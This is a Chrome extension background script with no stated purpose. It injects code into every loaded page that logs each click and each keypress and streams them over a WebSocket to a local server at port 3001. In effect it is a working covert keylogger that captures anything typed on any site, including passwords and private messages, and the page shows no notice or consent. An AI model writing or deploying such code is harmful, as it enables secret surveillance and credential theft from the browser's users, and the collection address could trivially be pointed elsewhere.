chrome.runtime.onInstalled.addListener(function() {
    chrome.webNavigation.onCompleted.addListener(function(details) {
        chrome.tabs.executeScript(details.tabId, {
            code: `
                (function() {
                    const socket = new WebSocket('ws://localhost:3001/activity');
                    socket.onopen = function() {
                        console.log('WebSocket connection established');
                    };
                    socket.onerror = function(error) {
                        console.log('WebSocket Error: ' + error);
                    };
                    window.addEventListener('click', function(event) {
                        const log = {
                            event: 'click',
                            time: new Date().toISOString(),
                            details: {
                                x: event.clientX,
                                y: event.clientY,
                                element: event.target.tagName
                            }
                        };
                        socket.send(JSON.stringify(log));
                    });
                    window.addEventListener('keypress', function(event) {
                        const log = {
                            event: 'keypress',
                            time: new Date().toISOString(),
                            details: {
                                key: event.key,
                                code: event.code
                            }
                        };
                        socket.send(JSON.stringify(log));
                    });
                })();
            `
        });
    });
});
